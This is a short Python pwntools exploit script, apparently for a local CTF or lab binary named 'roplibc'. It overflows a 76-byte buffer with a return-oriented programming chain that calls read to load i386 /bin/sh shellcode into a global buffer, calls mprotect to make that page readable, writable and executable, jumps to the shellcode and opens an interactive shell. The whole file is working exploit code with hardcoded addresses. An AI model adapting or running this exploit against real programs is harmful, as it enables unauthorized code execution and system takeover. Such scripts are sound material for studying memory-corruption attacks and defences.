from pwn import *

io = process("./roplibc")

shellcode = asm(shellcraft.i386.linux.sh())
# 76 = buf_offset
rop = 76 * "A"

rop += p32(0xf7ed8b00)          ## read
rop += p32(0x08048489)          ## 3 x pop; ret -> mprotect
rop += p32(0x00000000)          ## fd
rop += p32(0x08049720)          ## gbuf (find address with nm)
rop += p32(len(shellcode))      ## len

rop += p32(0xf7ee5da0)          ## mprotect    
rop += p32(0x08049720)          ## gbuf (this is where we jump to execute the shellcode)
rop += p32(0x08049000)          ## shellcode/gbuf page
rop += p32(0x1000)   ## PAGE_SIZE
rop += p32(4|2|1)    ## PROT_READ|PROT_WRITE|PROT_EXEC

rop += (128-len(rop)) * "A"

#gdb.attach(io)

# Send rop payload to buf
io.send(rop)
# Send the shellcode to gbuf
io.send(shellcode)

io.interactive()
